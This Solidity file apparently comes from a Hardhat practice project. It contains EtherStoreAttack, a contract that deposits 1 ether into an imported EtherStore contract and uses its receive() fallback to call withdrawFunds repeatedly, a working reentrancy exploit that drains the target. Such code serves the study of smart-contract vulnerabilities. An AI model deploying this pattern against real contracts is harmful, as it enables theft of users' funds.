// SPDX-License-Identifier: Unlicense
pragma solidity ^0.6.6;
import "./EtherStore.sol";
import "hardhat/console.sol";

contract EtherStoreAttack{
    EtherStore public store;
    uint256 public _wei = 1 ether;
    constructor(address _contract_address) payable public {
        store = EtherStore(_contract_address);
    }
    

    function attack() public payable {
        store.depositFunds{value:_wei}();
        if(store.balances(address(this))>0){
            store.withdrawFunds(_wei);
        }
    }

    receive() external payable {
        require(msg.value>0,"Zabb");
        if(address(store).balance>=_wei){
            console.log("attack:",msg.sender,"fff; ",msg.value);
            store.withdrawFunds(_wei);
        }
    }

}